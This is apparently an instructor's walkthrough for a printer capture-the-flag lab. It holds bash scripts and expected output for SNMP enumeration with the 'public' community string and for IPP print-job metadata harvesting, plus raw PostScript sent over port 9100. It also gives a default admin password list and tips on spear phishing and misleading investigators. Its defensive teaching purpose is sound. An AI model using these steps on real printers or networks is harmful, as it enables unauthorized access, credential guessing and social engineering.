As shown in Flag #1, professional penetration testers read ALL system information:

```bash
# Query sysContact as part of complete enumeration
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0
```

**Expected Output**:
```
SNMPv2-MIB::sysContact.0 = STRING: OVERCLOCK@OC.local | FLAG{LEIA83920174}
```

**Realistic Discovery Through Complete System Enumeration**:

```bash
# Professional approach: Document ALL system MIB values
echo "=== Complete System MIB Documentation ===" > system_mib_analysis.txt
echo "Target: 192.168.1.131" >> system_mib_analysis.txt
echo "Date: $(date)" >> system_mib_analysis.txt
echo "" >> system_mib_analysis.txt

# Standard system MIB OIDs with descriptions
declare -a oids=(
    "1.3.6.1.2.1.1.1.0:System Description"
    "1.3.6.1.2.1.1.2.0:System Object ID"
    "1.3.6.1.2.1.1.3.0:System Uptime"
    "1.3.6.1.2.1.1.4.0:System Contact"
    "1.3.6.1.2.1.1.5.0:System Name"
    "1.3.6.1.2.1.1.6.0:System Location"
    "1.3.6.1.2.1.1.7.0:System Services"
)

for oid_desc in "${oids[@]}"; do
    IFS=':' read -r oid desc <<< "$oid_desc"
    echo "[$desc]" >> system_mib_analysis.txt
    snmpget -v2c -c public 192.168.1.131 $oid 2>/dev/null >> system_mib_analysis.txt
    echo "" >> system_mib_analysis.txt
done

# Read the complete analysis
cat system_mib_analysis.txt
```

**Expected Complete Output**:
```
=== Complete System MIB Documentation ===
Target: 192.168.1.131
Date: Mon Nov 4 10:30:00 EST 2025

[System Description]
SNMPv2-MIB::sysDescr.0 = STRING: HP LaserJet MFP M428fdw

[System Object ID]
SNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.11.2.3.9.1

[System Uptime]
SNMPv2-MIB::sysUpTime.0 = Timeticks: (8640000) 1 day, 0:00:00.00

[System Contact]
SNMPv2-MIB::sysContact.0 = STRING: OVERCLOCK@OC.local | FLAG{LEIA83920174}

[System Name]
SNMPv2-MIB::sysName.0 = STRING: HP-Printer-OC

[System Location]
SNMPv2-MIB::sysLocation.0 = STRING: OC-Server-Room-B | FLAG{LUKE47239581}

[System Services]
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

**Instructor Analysis**:

Information revealed in sysContact:
- **Email Format**: `OVERCLOCK@OC.local`
- **Domain**: `OC.local` (internal Active Directory domain)
- **Flag**: `FLAG{LEIA83920174}` (appended data)

**Security Intelligence Gathered**:
- Internal domain name for targeted attacks
- Email format for phishing campaigns
- Organization naming conventions
- Potential username format

**Step 2: Verify IPP Doesn't Expose This**

```bash
# Get ALL IPP attributes and read through them
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-printer-attributes.test > ipp_complete.txt

# Read through the entire output looking for contact information
echo "[*] Searching for contact-related attributes in IPP..."
less ipp_complete.txt
# In less, press '/' then type: contact
# Then try: operator
# Then try: admin
# Then try: LEIA
```

**Expected Result**: 
- No "OVERCLOCK@OC.local" found in IPP
- No FLAG{LEIA...} visible in IPP output
- May find generic "printer-operator" but not the sysContact data

**Teaching Point**: This demonstrates that different protocols expose different information. Complete enumeration requires testing all available protocols.

**Step 3: Extended SNMP Intelligence Gathering**

```bash
# Document all contact and administrative information
echo "=== Administrative Information Intelligence ===" > admin_intel.txt

# Try common contact-related OIDs
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4 >> admin_intel.txt 2>&1
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11.2.3.9.4.2 >> admin_intel.txt 2>&1

# HP-specific MIBs that might contain contact info
snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11 | head -50 >> admin_intel.txt

# Read through all collected information
cat admin_intel.txt
```

**Why SNMP-Only Visibility Matters**:

1. **Incomplete Security Assessments**: Testing only web interface misses SNMP data
2. **Protocol-Specific Vulnerabilities**: Each protocol has unique weaknesses
3. **Defense in Depth Failures**: Securing one protocol isn't enough
4. **Compliance Gaps**: SNMP often forgotten in security policies

**Real-World Attack Scenarios**:

**Email and Domain Intelligence Extraction**:
```bash
# Extract email for intelligence gathering
snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0 > contact_info.txt
cat contact_info.txt

# Parse the output to extract useful information
email_domain=$(cat contact_info.txt | cut -d'=' -f2 | cut -d'|' -f1 | tr -d ' ')
echo "Discovered email/domain: $email_domain"

# Document intelligence value
echo "=== Intelligence Value ===" > intel_assessment.txt
echo "Email Format: $email_domain" >> intel_assessment.txt
echo "Domain extracted: $(echo $email_domain | cut -d'@' -f2)" >> intel_assessment.txt
echo "Username format: $(echo $email_domain | cut -d'@' -f1)" >> intel_assessment.txt
echo "Likely AD domain: Yes (.local extension)" >> intel_assessment.txt

cat intel_assessment.txt
```

**Social Engineering Preparation**:
- Use discovered email for spear phishing
- Reference printer location in pretexting
- Impersonate IT support with accurate details
- Craft believable scenarios using gathered intelligence

**Extended SNMP Reconnaissance Script**:

```bash
#!/bin/bash
# Comprehensive SNMP reconnaissance script

TARGET="192.168.1.131"
OUTPUT="snmp_full_recon.txt"

echo "=== SNMP Reconnaissance Report ===" > $OUTPUT
echo "Target: $TARGET" >> $OUTPUT
echo "Date: $(date)" >> $OUTPUT
echo "Community String: public" >> $OUTPUT
echo "" >> $OUTPUT

# System information
echo "[System Information]" >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.1.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.2.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.3.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.4.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.5.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.6.0 2>/dev/null >> $OUTPUT
snmpget -v2c -c public $TARGET 1.3.6.1.2.1.1.7.0 2>/dev/null >> $OUTPUT

echo "" >> $OUTPUT
echo "[Network Information]" >> $OUTPUT
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.4 2>/dev/null | head -20 >> $OUTPUT

echo "" >> $OUTPUT
echo "[Printer-Specific Information]" >> $OUTPUT
snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.43 2>/dev/null | head -20 >> $OUTPUT

echo "" >> $OUTPUT
echo "[HP-Specific OIDs]" >> $OUTPUT
snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.11 2>/dev/null | head -20 >> $OUTPUT

echo "Reconnaissance complete. Output saved to $OUTPUT"
echo "Now read through the complete file for intelligence gathering:"
echo "cat $OUTPUT | less"
```

**Common Student Mistakes**:
- Using grep to search for patterns instead of reading complete output
- Assuming IPP shows everything SNMP does
- Not documenting email/domain information
- Missing the security implications of contact data
- Not trying different community strings
- Overlooking social engineering potential

**Defensive Recommendations**:
- Store only necessary contact information
- Use SNMPv3 with encryption
- Implement SNMP access control lists
- Monitor SNMP queries
- Regular audits of SNMP data fields
- Disable SNMP if not actively used

---

### Flag #3: Web Interface Configuration - HAN

**Location**: Web Interface → IPP printer-info attribute  
**Flag**: `FLAG{HAN62947103}`  
**OWASP Category**: IoT-03 (Insecure Ecosystem Interfaces)

**Teaching Methodology**:

**Concept**: This flag requires manual configuration through the web interface, demonstrating how printer settings propagate to different protocols. Once set via web interface, it becomes visible through IPP queries.

**Why Web Configuration Matters**:
- Web interfaces often lack authentication
- Settings affect multiple protocols
- Configuration changes are rarely logged
- Default credentials commonly used
- Physical access often assumed as security

**Manual Configuration Process**:

**Step 1: Access Web Interface**

```bash
# First attempt HTTP
curl -I http://192.168.1.131

# If redirected to HTTPS or connection fails, try HTTPS
curl -k -I https://192.168.1.131
```

**If HTTPS with legacy TLS** (see Legacy Protocol Configuration section):
- Configure Firefox for legacy TLS
- Or use curl with specific TLS version:
```bash
curl -k --tlsv1.0 https://192.168.1.131
```

**Navigation Path**:
1. Browse to `http://192.168.1.131` or `https://192.168.1.131`
2. Navigate to: **General** → **About The Printer**
3. Click on **Configure Information**
4. Find **Nickname** or **Printer Description** field
5. Set value to: `HP-MFP-FLAG{HAN62947103}`
6. Apply/Save changes

**Instructor Note**: If the web interface requires authentication, common defaults include:
- Username: `admin`, Password: `admin`
- Username: `admin`, Password: (blank)
- Username: `admin`, Password: `password`
- Username: `admin`, Password: device serial number

**Step 2: Verify Configuration via IPP**

After web configuration, the flag becomes visible through IPP:

```bash
# Get ALL printer attributes and read through them
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-printer-attributes.test > all_attributes_after_config.txt

# Read through the complete output
cat all_attributes_after_config.txt | less
# In less, search for terms: info, description, nickname, model
```

**Expected to find in output**:
```
printer-info (textWithoutLanguage) = HP-MFP-FLAG{HAN62947103}
```

**Realistic Discovery Method**:

Instead of grepping for the flag, professional testers document ALL printer attributes:

```bash
# Create a comprehensive attribute documentation script
cat > document_printer_attributes.sh << 'EOF'
#!/bin/bash

echo "=== IPP Printer Attribute Documentation ==="
echo "Target: 192.168.1.131"
echo "Timestamp: $(date)"
echo ""

# Get all attributes
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-printer-attributes.test > full_ipp_enum.txt

# Extract and categorize key attributes
echo "[Device Information]"
cat full_ipp_enum.txt | while IFS= read -r line; do
    if [[ $line == *"printer-info"* ]] || 
       [[ $line == *"printer-name"* ]] || 
       [[ $line == *"printer-location"* ]] || 
       [[ $line == *"printer-make-and-model"* ]]; then
        echo "$line"
    fi
done

echo ""
echo "[Administrative Information]"
cat full_ipp_enum.txt | while IFS= read -r line; do
    if [[ $line == *"printer-operator"* ]] || 
       [[ $line == *"printer-admin"* ]] || 
       [[ $line == *"printer-uri"* ]]; then
        echo "$line"
    fi
done

echo ""
echo "[Capabilities]"
cat full_ipp_enum.txt | while IFS= read -r line; do
    if [[ $line == *"printer-state"* ]] || 
       [[ $line == *"operations-supported"* ]]; then
        echo "$line"
    fi
done

echo ""
echo "Full enumeration saved to: full_ipp_enum.txt"
echo "Read complete file with: less full_ipp_enum.txt"
EOF

chmod +x document_printer_attributes.sh
./document_printer_attributes.sh
```

**Teaching Points**:

**Configuration Propagation**:
1. Web interface modifies internal configuration
2. Changes reflect in IPP responses
3. May also visible in SNMP (vendor-specific OIDs)
4. Demonstrates interconnected services

**Security Implications**:
- Unauthenticated configuration changes
- No audit trail of modifications
- Settings persist across reboots
- Can be used for persistent markers

**Step 3: Enumerate Other Writable Fields**

```bash
# Read through ALL attributes to identify configurable fields
less full_ipp_enum.txt

# Common writable fields to note:
# - printer-info (device description/nickname)
# - printer-location (physical location)
# - printer-operator (operator contact)
# - printer-admin-uri (administrative URL)
```

**Automated Configuration Check**:

```bash
# Script to check if web interface requires authentication
#!/bin/bash

echo "=== Web Interface Authentication Check ==="
TARGET="192.168.1.131"

# Test HTTP
echo "[*] Testing HTTP..."
http_code=$(curl -s -o /dev/null -w "%{http_code}" http://$TARGET)
echo "HTTP Response Code: $http_code"

if [ "$http_code" == "200" ]; then
    echo "[+] HTTP accessible without authentication"
elif [ "$http_code" == "401" ]; then
    echo "[-] HTTP requires authentication (401)"
elif [ "$http_code" == "301" ] || [ "$http_code" == "302" ]; then
    echo "[!] HTTP redirects (likely to HTTPS)"
fi

# Test HTTPS with legacy TLS
echo ""
echo "[*] Testing HTTPS..."
https_code=$(curl -k --tlsv1.0 -s -o /dev/null -w "%{http_code}" https://$TARGET 2>/dev/null)
echo "HTTPS Response Code: $https_code"

if [ "$https_code" == "200" ]; then
    echo "[+] HTTPS accessible without authentication"
elif [ "$https_code" == "401" ]; then
    echo "[-] HTTPS requires authentication"
    echo "    Common defaults to try:"
    echo "    - admin:(blank)"
    echo "    - admin:admin"
    echo "    - admin:password"
fi
```

**Web Interface Enumeration**:

```bash
# Download web interface pages for analysis
wget -r -l 2 -k --no-check-certificate http://192.168.1.131/ -P web_mirror/ 2>/dev/null

# Analyze downloaded content
echo "=== Web Interface Analysis ==="
find web_mirror/ -type f -name "*.html" -o -name "*.htm" | while read file; do
    echo "Analyzing: $file"
    # Read through files for configuration options
    cat "$file" | head -50
done
```

**Real-World Attack Scenarios**:

**Persistent Backdoor Marker**:
```bash
# Set a persistent identifier via web interface
# This survives firmware updates and factory resets in some models
# Can be used to track compromised devices
```

**Information Injection**:
```bash
# Inject false information to misdirect investigation
# Set printer-location to "Building-C" when it's in Building-A
# Set printer-operator to legitimate IT staff name
```

**Common Student Mistakes**:
- Using grep instead of reading complete IPP output
- Not checking if web interface requires authentication
- Missing the connection between web config and IPP
- Not documenting the navigation path
- Forgetting to verify changes via IPP
- Not exploring other configuration options

**Defensive Recommendations**:
- Enable authentication on web interface
- Use strong, unique passwords
- Implement HTTPS instead of HTTP
- Log configuration changes
- Restrict web interface to management VLAN
- Regular configuration audits

---

### Flag #4: Print Job Author Metadata - PADME

**Location**: Print job %%Author attribute in PostScript  
**Flag**: `FLAG{PADME91562837}`  
**OWASP Category**: IoT-06 (Insufficient Privacy Protection)

**Teaching Methodology**:

**Concept**: Print jobs contain extensive metadata that persists in print queues and can be retrieved through IPP. The PostScript %%Author field demonstrates how document metadata becomes accessible through printer protocols.

**Why Print Job Metadata Matters**:
- Reveals who printed what and when
- Contains document properties
- Shows internal project names
- Identifies software and versions
- Persists in queues and history

**Understanding Print Job Flow**:

```
Document Creation → Print Driver → Network Transport → Print Queue → Processing
        ↓                ↓                ↓                ↓            ↓
    Metadata Added   More Metadata    Transmitted      Stored      Accessible
```

**PostScript Structure Analysis**:

PostScript files contain structured comments with metadata:
```postscript
%!PS-Adobe-3.0                          # PostScript version
%%Title: Document Title                  # Document title
%%Author: Username                       # Author information
%%Creator: Application Name              # Creating application
%%CreationDate: Date                     # Timestamp
%%Pages: Number                          # Page count
```

**Discovery Process**:

**Step 1: Check Print Queue Status**

```bash
# Create IPP query for all jobs
cat > get-all-jobs-complete.test << 'EOF'
{
    NAME "Get All Print Jobs with Complete Attributes"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri $uri
    ATTR keyword which-jobs not-completed
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF

# Execute and save full job information
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-jobs-complete.test > all_jobs_detailed.txt
```

**Step 2: Read Through Complete Job Information**

```bash
# Read the complete output systematically
echo "=== Reading Print Job Queue Information ==="
cat all_jobs_detailed.txt | less

# In less, look for:
# - job-originating-user-name
# - job-name
# - document-name
# - date-time-at-creation
# - job-state
```

**Expected to Find in Output** (relevant portions):
```
job-id (integer) = 1
job-state (enum) = pending
job-originating-user-name (nameWithoutLanguage) = FLAG{PADME91562837}
job-name (nameWithoutLanguage) = OVERCLOCK-Job-FLAG{MACE41927365}
date-time-at-creation (dateTime) = 2025-11-04T12:00:00Z
document-format (mimeMediaType) = application/postscript
```

**Realistic Job Analysis Method**:

```bash
#!/bin/bash
# Professional print job analysis script

echo "=== Comprehensive Print Job Analysis ==="
echo "Target: 192.168.1.131"
echo "Analysis Date: $(date)"
echo ""

# Get jobs in different states
for state in "not-completed" "completed" "all"; do
    echo "[Analyzing $state jobs]"
    
    cat > get-${state}-jobs.test << EOF
{
    NAME "Get $state Jobs"
    OPERATION Get-Jobs
    GROUP operation-attributes-tag
    ATTR charset attributes-charset utf-8
    ATTR language attributes-natural-language en
    ATTR uri printer-uri \$uri
    ATTR keyword which-jobs $state
    ATTR keyword requested-attributes all
    STATUS successful-ok
}
EOF
    
    ipptool -tv ipp://192.168.1.131:631/ipp/print get-${state}-jobs.test > jobs_${state}.txt 2>&1
    
    # Document what we found
    echo "  Total lines of output: $(wc -l < jobs_${state}.txt)"
    echo "  Checking for job IDs..."
    
    # Extract and display job information
    while IFS= read -r line; do
        if [[ $line == *"job-id"* ]]; then
            echo "  Found: $line"
        elif [[ $line == *"job-originating-user-name"* ]]; then
            echo "  User: $line"
        elif [[ $line == *"job-name"* ]]; then
            echo "  Name: $line"
        fi
    done < jobs_${state}.txt
    echo ""
done

echo "Complete job details saved to jobs_*.txt files"
echo "Read with: cat jobs_not-completed.txt | less"
```

**Understanding the PostScript Metadata Connection**:

The PostScript file submitted contains:
```postscript
%%Author: FLAG{PADME91562837}
```

This becomes the `job-originating-user-name` in IPP, revealing:
- User identification
- Potential credentials
- Asset tags or identifiers

**Step 3: Retrieve Completed Jobs**

If jobs have already printed, check completed jobs:

```bash
# Query completed jobs
ipptool -tv ipp://192.168.1.131:631/ipp/print get-completed-jobs.test > completed_jobs.txt

# Read through the complete output
echo "=== Completed Jobs Analysis ==="
cat completed_jobs.txt | less
# Look for the same attributes as above
```

**Deep Dive: Understanding Job Attributes**

```bash
# Create a job attribute documentation
echo "=== IPP Job Attribute Reference ===" > job_attributes_guide.txt
echo "" >> job_attributes_guide.txt
echo "Critical Attributes for Intelligence:" >> job_attributes_guide.txt
echo "- job-originating-user-name: Who submitted the job" >> job_attributes_guide.txt
echo "- job-name: Title from PostScript %%Title" >> job_attributes_guide.txt
echo "- document-name: Original filename" >> job_attributes_guide.txt
echo "- date-time-at-creation: When submitted" >> job_attributes_guide.txt
echo "- job-originating-host-name: Source computer" >> job_attributes_guide.txt
echo "" >> job_attributes_guide.txt

# Now analyze our captured jobs with this knowledge
echo "Reading job data with understanding of attributes..." >> job_attributes_guide.txt
cat all_jobs_detailed.txt >> job_attributes_guide.txt

# Read the complete guide
less job_attributes_guide.txt
```

**Real-World Intelligence Value**:

**User Identification**:
- Usernames for targeted attacks
- Email addresses in Author field
- Department information
- Organizational hierarchy

**Document Intelligence**:
- Project names in titles
- Software versions in Creator
- Timing patterns from dates
- Document classification levels

**Privacy Analysis Script**:

```bash
#!/bin/bash
# Extract intelligence from print jobs without grep

echo "=== Print Job Intelligence Extraction ==="
OUTPUT="print_job_intel.txt"

# Get all job data
ipptool -tv ipp://192.168.1.131:631/ipp/print get-all-jobs.test > raw_jobs.txt

# Parse line by line
echo "[Extracted Intelligence]" > $OUTPUT
while IFS= read -r line; do
    # Check each line for intelligence value
    case "$line" in
        *"job-originating-user-name"*)
            echo "User found: $line" >> $OUTPUT
            ;;
        *"job-name"*)
            echo "Document: $line" >> $OUTPUT
            ;;
        *"job-originating-host-name"*)
            echo "Host: $line" >> $OUTPUT
            ;;
        *"date-time-at"*)
            echo "Time: $line" >> $OUTPUT
            ;;
    esac
done < raw_jobs.txt

echo "" >> $OUTPUT
echo "[Analysis Summary]" >> $OUTPUT
echo "Total jobs processed: $(cat raw_jobs.txt | wc -l) lines of data" >> $OUTPUT

cat $OUTPUT
```

**Common Student Mistakes**:
- Using grep to search for flags instead of reading complete output
- Only checking current print queue, missing completed jobs
- Not understanding the difference between job states
- Missing the connection between PostScript headers and IPP attributes
- Not documenting all metadata fields
- Forgetting to check both upcoming and completed queues

**Defensive Recommendations**:
- Enable authentication for print submission
- Implement job encryption
- Regular purging of job history
- Strip metadata from documents before printing
- Use secure printing with PIN codes
- Implement print quotas and monitoring

---

### Flag #5: Print Job Title/Name - MACE

**Location**: Print job %%Title / job-name attribute  
**Flag**: `FLAG{MACE41927365}`  
**OWASP Category**: IoT-07 (Insecure Data Transfer and Storage)

**Teaching Methodology**:

**Concept**: The PostScript %%Title field becomes the job-name in IPP. This demonstrates how document metadata propagates through the printing system and remains accessible.

**Why Job Names Are Sensitive**:
- Reveal document purposes
- Contain project codenames
- Show organizational structure
- Indicate timing of activities
- May include classification levels

**Discovery Process**:

**Step 1: Systematic Job Name Analysis**

Since we already retrieved all job data in Flag #4, we continue our analysis:

```bash
# Read through our previously captured job data
cat all_jobs_detailed.txt | less

# Focus on job-name attributes
# The flag is embedded in: OVERCLOCK-Job-FLAG{MACE41927365}
```

**Professional Method - Job Intelligence Report**:

```bash
#!/bin/bash
# Create comprehensive job intelligence report

echo "=== Print Job Intelligence Report ===" > job_intel_report.txt
echo "Generated: $(date)" >> job_intel_report.txt
echo "Target: 192.168.1.131" >> job_intel_report.txt
echo "" >> job_intel_report.txt

# Parse job data systematically
echo "[Job Details]" >> job_intel_report.txt
current_job=""
while IFS= read -r line; do
    # Track job boundaries
    if [[ $line == *"job-id"* ]]; then
        echo "" >> job_intel_report.txt
        echo "--- Job Entry ---" >> job_intel_report.txt
        echo "$line" >> job_intel_report.txt
        current_job=$(echo "$line" | cut -d'=' -f2)
    elif [[ $line == *"job-name"* ]]; then
        echo "$line" >> job_intel_report.txt
        # Note: job-name contains FLAG{MACE41927365}
    elif [[ $line == *"job-originating-user-name"* ]]; then
        echo "$line" >> job_intel_report.txt
        # Note: user-name contains FLAG{PADME91562837}
    elif [[ $line == *"job-state"* ]]; then
        echo "$line" >> job_intel_report.txt
    elif [[ $line == *"date-time"* ]]; then
        echo "$line" >> job_intel_report.txt
    fi
done < all_jobs_detailed.txt

echo "" >> job_intel_report.txt
echo "[Intelligence Summary]" >> job_intel_report.txt
echo "- Multiple jobs discovered with embedded identifiers" >> job_intel_report.txt
echo "- Job naming convention: OVERCLOCK-Job-[identifier]" >> job_intel_report.txt
echo "- User identification pattern found" >> job_intel_report.txt
echo "- Temporal patterns can be analyzed from timestamps" >> job_intel_report.txt

# Display the report
cat job_intel_report.txt
```

**Understanding the PostScript Origin**:

The PostScript file contains:
```postscript
%%Title: OVERCLOCK Report - Security Assessment
```

The print system modified this to include the job identifier, resulting in:
```
job-name = OVERCLOCK-Job-FLAG{MACE41927365}
```

**Step 2: Pattern Analysis**

```bash
# Analyze all job names for patterns
echo "=== Job Naming Pattern Analysis ==="

# Extract all job names from our data
while IFS= read -r line; do
    if [[ $line == *"job-name"* ]]; then
        # Extract just the value part
        name_value=$(echo "$line" | cut -d'=' -f2-)
        echo "Found job: $name_value"
    fi
done < all_jobs_detailed.txt

# Expected output:
# Found job: OVERCLOCK-Job-FLAG{MACE41927365}
# Found job: Network Configuration Report
# Found job: Security Assessment Results
```

**Step 3: Comprehensive Job Analysis**

```bash
# Create job analysis matrix
cat > analyze_all_jobs.sh << 'EOF'
#!/bin/bash

echo "=== Complete Job Analysis Matrix ==="
echo ""
echo "Job# | User | Title | State | Time"
echo "-----+------+-------+-------+------"

job_num=0
user=""
title=""
state=""
time=""

while IFS= read -r line; do
    if [[ $line == *"job-id"* ]]; then
        # Print previous job if exists
        if [ $job_num -gt 0 ]; then
            echo "$job_num | $user | $title | $state | $time"
        fi
        # Start new job
        job_num=$(echo "$line" | sed 's/.*= //')
        user=""
        title=""
        state=""
        time=""
    elif [[ $line == *"job-originating-user-name"* ]]; then
        user=$(echo "$line" | sed 's/.*= //')
    elif [[ $line == *"job-name"* ]]; then
        title=$(echo "$line" | sed 's/.*= //')
    elif [[ $line == *"job-state"* ]]; then
        state=$(echo "$line" | sed 's/.*= //')
    elif [[ $line == *"date-time-at-creation"* ]]; then
        time=$(echo "$line" | sed 's/.*= //')
    fi
done < all_jobs_detailed.txt

# Print last job
if [ $job_num -gt 0 ]; then
    echo "$job_num | $user | $title | $state | $time"
fi
EOF

chmod +x analyze_all_jobs.sh
./analyze_all_jobs.sh
```

**Real-World Attack Implications**:

**Project Intelligence**:
- "OVERCLOCK" appears to be project name
- Multiple assessment documents submitted
- Security assessment in progress
- Network configuration changes occurring

**Temporal Analysis**:
```bash
# Analyze printing patterns
echo "=== Temporal Analysis ==="
while IFS= read -r line; do
    if [[ $line == *"date-time-at-creation"* ]]; then
        timestamp=$(echo "$line" | cut -d'=' -f2)
        echo "Job submitted at: $timestamp"
    fi
done < all_jobs_detailed.txt
```

**PRET Framework Attempt** (showing limitations):

```bash
# Try to use PRET for job enumeration
cd ~/PRET
python3 pret.py 192.168.1.131 ps

# In PRET shell:
192.168.1.131:/> jobs
# Note: PRET may not show IPP queue jobs
# This demonstrates tool limitations

192.168.1.131:/> capture
# May capture different data than IPP

192.168.1.131:/> exit
```

**Memory-Based Recovery Alternative**:

Some printers store jobs in accessible memory:

```bash
# Manual PostScript commands to query printer
echo "%!PS" | nc -w 2 192.168.1.131 9100
echo "statusdict begin" | nc -w 2 192.168.1.131 9100
echo "jobinfo" | nc -w 2 192.168.1.131 9100
```

**Network Traffic Analysis**:

```bash
# Capture print traffic for analysis
sudo tcpdump -i eth0 -A -s0 'host 192.168.1.131 and (port 631 or port 9100)' > print_traffic.txt 2>&1 &

# After capturing some traffic
cat print_traffic.txt | less
# Look for PostScript headers and job information
```

**Common Student Mistakes**:
- Using grep to find flags instead of understanding the data
- Not recognizing job-name comes from %%Title
- Missing the correlation between PostScript and IPP
- Not analyzing all three submitted jobs
- Forgetting jobs may be in different states
- Not documenting job patterns and metadata

**Defensive Recommendations**:
- Require authentication for job submission
- Implement job encryption (IPP over TLS)
- Regular purging of job history
- Sanitize job names and metadata
- Monitor for suspicious job patterns
- Implement print quotas
- Use pull printing with authentication

---

## Attack Flow Summary

### Phase 1: Initial Reconnaissance
1. **Network Discovery**: Identify printer at 192.168.1.131
2. **Port Scanning**: Discover SNMP (161), HTTP (80/443), IPP (631), Raw printing (9100)
3. **Service Enumeration**: Identify HP printer model and services
4. **Protocol Analysis**: Understand which protocols are active

### Phase 2: SNMP Exploitation
1. **Community String Testing**: Confirm "public" community string works
2. **System Information Gathering**: Enumerate all system OIDs
3. **Flag Discovery**:
   - FLAG{LUKE47239581} in sysLocation (1.3.6.1.2.1.1.6.0)
   - FLAG{LEIA83920174} in sysContact (1.3.6.1.2.1.1.4.0)
4. **Intelligence Collection**: Document admin contact, location, device info

### Phase 3: IPP Protocol Analysis
1. **Printer Attributes Enumeration**: Get all printer capabilities
2. **Verify LUKE Flag**: Confirm sysLocation also visible via IPP
3. **Note LEIA Absence**: Confirm sysContact NOT visible via IPP
4. **Job Queue Analysis**: Check for pending and completed jobs

### Phase 4: Web Interface Configuration
1. **Access Web Interface**: Browse to http://192.168.1.131
2. **Navigate to Settings**: General → About → Configure Information
3. **Set Nickname**: Configure to "HP-MFP-FLAG{HAN62947103}"
4. **Verify via IPP**: Confirm flag visible in printer-info attribute

### Phase 5: Print Job Intelligence
1. **Queue Enumeration**: Identify jobs in "not-completed" state
2. **Metadata Extraction**:
   - FLAG{PADME91562837} in job-originating-user-name (%%Author)
   - FLAG{MACE41927365} in job-name (%%Title)
3. **Pattern Analysis**: Document job submission patterns
4. **Historical Analysis**: Check completed jobs for additional intelligence

### Key Teaching Points Demonstrated

**Protocol Diversity**:
- Same information accessible via multiple protocols (LUKE via SNMP and IPP)
- Protocol-specific information (LEIA only via SNMP)
- Web configuration propagating to IPP
- Print job metadata exposure

**Information Disclosure Vectors**:
- SNMP management data
- IPP printer attributes
- Print job metadata
- Web interface configuration
- Job queue persistence

**Real-World Attack Implications**:
- User identification from print jobs
- Physical location disclosure
- Email/domain harvesting
- Document intelligence gathering
- Temporal pattern analysis

---

## Key Takeaways and Defense

### OWASP IoT Top 10 Coverage

**IoT-02: Insecure Network Services**
- SNMP with default "public" community string
- IPP without authentication
- Raw printing port accepting any data
- Multiple services increasing attack surface

**IoT-03: Insecure Ecosystem Interfaces**
- Web interface allowing unauthenticated configuration
- IPP exposing extensive metadata
- No rate limiting on queries
- Information disclosure through multiple interfaces

**IoT-06: Insufficient Privacy Protection**
- Print job metadata revealing user information
- Document titles and project names exposed
- No anonymization of job submitters
- Historical job data retained

**IoT-07: Insecure Data Transfer and Storage**
- SNMP v2c transmitting in clear text
- IPP over HTTP (not HTTPS)
- Print jobs unencrypted in queue
- Metadata stored without protection

### Critical Security Issues Identified

1. **Default SNMP Configuration**
   - Community string "public" allows read access
   - Exposes device and network information
   - Often forgotten in security audits
   - May allow write access with "private"

2. **Metadata Persistence**
   - Print jobs retain extensive metadata
   - Information persists after printing
   - Accessible without authentication
   - Privacy implications for users

3. **Multi-Protocol Information Disclosure**
   - Same data accessible via different paths
   - Increases reconnaissance options
   - Complicates security hardening
   - Not all protocols may be monitored

4. **Configuration Management**
   - Web interface lacks authentication
   - Changes affect multiple protocols
   - No audit logging of modifications
   - Settings persist indefinitely

### Comprehensive Defense Strategy

#### Immediate Mitigations

1. **SNMP Hardening**
```bash
# Disable SNMP if not required
# Or implement these controls:
- Change community strings from defaults
- Use SNMPv3 with authentication and encryption
- Implement ACLs limiting SNMP access
- Monitor SNMP queries for anomalies
```

2. **IPP Security**
```bash
# Secure IPP implementation:
- Enable IPP over TLS (IPPS on port 443)
- Require authentication for job submission
- Implement job encryption
- Regular purging of job history
- Disable job attribute queries
```

3. **Web Interface Protection**
```bash
# Web interface hardening:
- Enable authentication (strong passwords)
- Use HTTPS instead of HTTP
- Implement session management
- Log configuration changes
- Restrict access to management VLAN
```

4. **Print Job Privacy**
```bash
# Protect print job data:
- Enable secure/pull printing
- Implement job encryption
- Automatic job purging
- Metadata sanitization
- User awareness training
```

#### Long-term Security Architecture

**Network Segmentation**:
```
[User VLAN] → [Firewall] → [Printer VLAN] ← [Firewall] ← [Management VLAN]
                              ↓
                        [Print Server]
                        (Authentication)
                        (Encryption)
                        (Auditing)
```

**Security Controls by Layer**:

**Network Layer**:
- VLAN isolation for printers
- Firewall rules restricting access
- IDS/IPS monitoring for anomalies
- Network access control (NAC)

**Protocol Layer**:
- Disable unnecessary protocols
- Encrypt all communications
- Strong authentication required
- Rate limiting implemented

**Application Layer**:
- Regular firmware updates
- Configuration standards
- Security baseline enforcement
- Compliance monitoring

**Data Layer**:
- Job encryption at rest
- Metadata minimization
- Automatic data purging
- Privacy controls

### Monitoring and Detection

**Key Events to Monitor**:

1. **SNMP Activity**
```bash
# Log and alert on:
- Community string failures
- Excessive SNMP walks
- SNMP SET operations
- Unusual source IPs
```

2. **Print Job Patterns**
```bash
# Monitor for:
- After-hours printing
- Large job submissions
- Unusual job names
- Failed job submissions
- Administrative actions
```

